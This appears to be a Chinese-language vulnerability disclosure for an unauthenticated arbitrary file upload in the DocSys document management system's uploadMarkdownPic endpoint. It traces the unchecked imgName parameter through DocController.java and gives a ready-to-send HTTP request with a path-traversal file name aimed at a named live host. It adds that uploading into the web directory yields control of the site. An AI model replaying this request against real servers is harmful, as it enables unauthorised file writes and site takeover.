# DocSys-任意文件上传漏洞

## 漏洞描述

DocSys-master 是一款文档管理系统。其认证src/com/DocSystem/controller/DocController.java的uploadMarkdownPic接口存在任意文件上传漏洞：

---

## 影响版本

DocSys-master（最新版本）

[DocSys_V2.02.85](https://gitee.com/RainyGao/DocSys/releases/tag/DocSys_V2.02.85)

---

## 利用条件

- 远程访问
- 无需登录

---

## 漏洞复现

### 任意文件上传

**文件路径**：`src/com/DocSystem/controller/DocController.java`
**行号**：2019-2024

用户请求参数文件名String imgName和 文件内容MultipartFile file直接来自 HTTP 请求，用户可控

![image-20260803194710833](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803194710833.png)

行号: 2081-2088 — imgName 直接赋值给 fileName，无任何路径检测

 行号: 2090-2095 — 创建目录（只创建 res/ 目录，不校验目标路径）

行号: 2097 — 文件写入

![image-20260803195014637](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803195014637.png)

---

漏洞复现：

**请求包**：前台文件上传

```
POST /DocSystem/Doc/uploadMarkdownPic.do?reposId=9&path=Lw&name=dGVzdC50eHQ&imgName=../../../../../../../../tmp/test2026.txt HTTP/1.1
Host: dw.gofreeteam.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Content-Length: 147

------WebKitFormBoundary
Content-Disposition: form-data; name="editormd-image-file"; filename="test.txt"

test2026
------WebKitFormBoundary--
```

![image-20260803183835811](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803183835811.png)

成功上传文件到/tmp/test2026.txt,可上传至web目录下获取网站权限



